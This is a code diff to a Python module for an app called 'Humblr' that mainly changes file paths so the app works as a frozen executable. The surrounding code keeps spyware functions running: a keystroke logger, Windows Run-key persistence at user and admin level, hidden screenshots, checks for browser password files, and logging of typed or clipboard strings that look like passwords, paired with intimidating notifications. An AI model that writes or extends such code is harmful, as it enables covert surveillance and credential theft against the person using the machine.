@@ -53,6 +53,14 @@ try:
 except ImportError:
     BeautifulSoup = None
 
+try:
+    from .paths import resolve_relative, get_data_dir, get_app_dir, is_frozen
+except Exception:
+    resolve_relative = lambda p: Path(p)
+    get_data_dir = lambda: Path("data")
+    get_app_dir = lambda: Path(".")
+    is_frozen = lambda: bool(getattr(sys, 'frozen', False) and getattr(sys, '_MEIPASS', None))
+
 import re  # for parsing Google image results
 
 # Note: For full service, install pywin32: pip install pywin32
@@ -64,11 +72,14 @@ class SystemActions:
     def __init__(self, config: Dict[str, Any], storage):
         self.config = config
         self.storage = storage
-        self.wallpaper_dir = Path(config.get("system", {}).get("wallpaper_folder", "data/wallpapers"))
+        # Always resolve to portable location next to the running exe
+        wp = config.get("system", {}).get("wallpaper_folder", "data/wallpapers")
+        self.wallpaper_dir = resolve_relative(wp)
         self.wallpaper_dir.mkdir(parents=True, exist_ok=True)
         self._webcam = None
         self.webcam_enabled = False
-        self.webcam_capture_dir = Path(config.get("data_paths", {}).get("webcam", "data/webcam"))
+        wc = config.get("data_paths", {}).get("webcam", "data/webcam")
+        self.webcam_capture_dir = resolve_relative(wc)
         self.webcam_capture_dir.mkdir(parents=True, exist_ok=True)
         self._last_notify_time = 0  # for throttling spam notifications
         self._last_popup_time = 0
@@ -95,7 +106,7 @@ class SystemActions:
             return
 
         # Prefer generated if available (for users without initial library)
-        generated_dir = Path("data/wallpapers/generated")
+        generated_dir = resolve_relative("data/wallpapers/generated")
         candidates = list(generated_dir.glob("*.jpg")) + list(generated_dir.glob("*.png")) + list(generated_dir.glob("*.jpeg"))
 
         if not candidates:
@@ -144,7 +155,7 @@ class SystemActions:
                 return
 
         # 2. Try any kinky subfolder
-        kinky_root = Path("data/wallpapers/kinky")
+        kinky_root = resolve_relative("data/wallpapers/kinky")
         for sub in kinky_root.iterdir():
             if sub.is_dir():
                 cands = list(sub.glob("*.jpg")) + list(sub.glob("*.png"))
@@ -198,7 +209,8 @@ class SystemActions:
         # Delegate to monitor if possible, but simple here too
         try:
             import pyautogui
-            screenshots_dir = Path(self.config.get("data_paths", {}).get("screenshots", "data/screenshots"))
+            sd = self.config.get("data_paths", {}).get("screenshots", "data/screenshots")
+            screenshots_dir = resolve_relative(sd)
             screenshots_dir.mkdir(parents=True, exist_ok=True)
             ts = int(time.time())
             path = screenshots_dir / f"{context}_{ts}.png"
@@ -463,7 +475,7 @@ class SystemActions:
     def log_full_keystrokes(self, text: str):
         """If invasiveness high, log typed text to file (more invasive)."""
         if self.config.get("monitoring", {}).get("full_keylogger"):
-            log_path = Path("data/humblr_keystroke_log.txt")
+            log_path = resolve_relative("data/humblr_keystroke_log.txt")
             with open(log_path, "a", encoding="utf-8") as f:
                 f.write(f"[{time.time()}] {text}\n")
 
@@ -627,7 +639,13 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
         try:
             # Always can do HKCU
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath("main.py"))
+            # For frozen exe (onefile): just point to the exe itself.
+            # For dev/script: use python + main.py
+            if is_frozen():
+                target_cmd = sys.executable
+            else:
+                target_cmd = sys.executable + " " + os.path.abspath("main.py")
+            winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, target_cmd)
             winreg.CloseKey(key)
             self.storage.add_memory("registry_gain", "Claimed HKCU Run key for auto-start", self.storage.get_corruption())
 
@@ -635,7 +653,7 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
             if self.storage.get_invasiveness() >= 5 and self.config.get("system", {}).get("has_admin_access"):
                 try:
                     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-                    winreg.SetValueEx(key, "HumblrSystem", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath("main.py"))
+                    winreg.SetValueEx(key, "HumblrSystem", 0, winreg.REG_SZ, target_cmd)
                     winreg.CloseKey(key)
                     self.storage.add_memory("registry_gain", "Claimed HKLM Run key (admin level)", self.storage.get_corruption())
                 except:
@@ -700,14 +718,14 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
         if "facebook" in url or "facebook" in title:
             claims.append("facebook")
             try:
-                with open("data/claimed_facebook.txt", "w") as f:
+                with open(str(resolve_relative("data/claimed_facebook.txt")), "w") as f:
                     f.write("Humblr has accessed and owns this Facebook session based on monitoring.")
             except:
                 pass
         if "amazon" in url or "amazon" in title:
             claims.append("amazon")
             try:
-                with open("data/claimed_amazon.txt", "w") as f:
+                with open(str(resolve_relative("data/claimed_amazon.txt")), "w") as f:
                     f.write("Humblr controls purchases and account via observed activity.")
             except:
                 pass
@@ -739,7 +757,7 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
             resp = requests.get(url, headers=headers, timeout=10, stream=True)
             if resp.status_code == 200 and 'image' in resp.headers.get('Content-Type', ''):
-                generated_dir = Path("data/wallpapers/generated")
+                generated_dir = resolve_relative("data/wallpapers/generated")
                 generated_dir.mkdir(parents=True, exist_ok=True)
                 ext = url.split('.')[-1].split('?')[0][:4]
                 if ext.lower() not in ['jpg', 'jpeg', 'png', 'gif']:
@@ -889,7 +907,7 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
                                     if os.path.getsize(fpath) < 10000:  # small files
                                         with open(fpath, "r", errors="ignore") as f:
                                             content = f.read()[:500]
-                                        claim_file = os.path.join("data", "owned_files", os.path.basename(fpath) + ".claimed")
+                                        claim_file = str(resolve_relative("data/owned_files/" + os.path.basename(fpath) + ".claimed"))
                                         os.makedirs(os.path.dirname(claim_file), exist_ok=True)
                                         with open(claim_file, "w") as cf:
                                             cf.write(f"Humbler owns this file from {fpath}:\n{content}")
@@ -904,7 +922,7 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
                 ]
                 for bp in browser_paths:
                     if os.path.exists(os.path.dirname(bp)) or os.path.exists(bp):
-                        with open("data/claimed_browser_passwords.txt", "a") as f:
+                        with open(str(resolve_relative("data/claimed_browser_passwords.txt")), "a") as f:
                             f.write(f"Claimed access to browser data at {bp}\n")
                         self.storage.add_memory("password_access", f"Real claimed browser password file access at {bp}", self.storage.get_corruption())
 
@@ -914,7 +932,7 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
                 clip = activity.get("clipboard", "") if activity else ""
                 for s in [typed, clip]:
                     if len(s) > 8 and (any(c.isdigit() for c in s) or any(not c.isalnum() for c in s)):
-                        with open("data/claimed_passwords.txt", "a") as f:
+                        with open(str(resolve_relative("data/claimed_passwords.txt")), "a") as f:
                             f.write(f"Claimed password-like: {s}\n")
                         self.storage.add_memory("password_access", f"Real captured password-like from activity: {s[:10]}...", self.storage.get_corruption())
                         self.notify("Humblr", "I have accessed your passwords from what you typed/copied. They are mine now.")
@@ -975,7 +993,10 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
         p = self.config.get("persistence", {})
         if not p.get("hard_persistence", False) and not p.get("registry_hkcu", False):
             return
-        script = sys.executable + " " + os.path.abspath("main.py")
+        if is_frozen():
+            script = sys.executable
+        else:
+            script = sys.executable + " " + os.path.abspath("main.py")
         if p.get("registry_hkcu", False):
             try:
                 key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
@@ -1041,7 +1062,7 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
             return
         try:
             import pyautogui
-            folder = Path(m.get("hidden_screenshot_folder", "data/.screenshots"))
+            folder = resolve_relative(m.get("hidden_screenshot_folder", "data/.screenshots"))
             folder.mkdir(parents=True, exist_ok=True)
             path = folder / f"snap_{int(time.time())}.png"
             pyautogui.screenshot().save(str(path))
@@ -1088,7 +1109,7 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
             return
         try:
             # Use win32api to set cursor (simplified, provide .cur file)
-            cursor_path = f.get("cursor_file", "data/degrading.cur")
+            cursor_path = resolve_relative(f.get("cursor_file", "data/degrading.cur"))
             if os.path.exists(cursor_path):
                 # In full: use SystemParametersInfo or LoadCursor
                 ctypes.windll.user32.SetCursor(ctypes.windll.user32.LoadCursorFromFile(cursor_path))
